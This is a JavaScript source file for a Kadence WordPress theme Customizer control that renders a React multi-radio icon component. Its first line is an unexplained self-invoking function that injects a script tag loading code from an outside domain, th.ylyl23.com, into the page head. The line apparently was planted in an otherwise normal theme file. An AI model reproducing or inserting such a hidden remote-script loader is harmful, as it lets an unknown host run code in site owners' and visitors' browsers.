(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';

import MultiRadioIconComponent from './multi-radio-icon-component.js';

export const MultiRadioIconControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <MultiRadioIconComponent control={control}/> );
		// ReactDOM.render(
		// 		<MultiRadioIconComponent control={control}/>,
		// 		control.container[0]
		// );
	}
} );
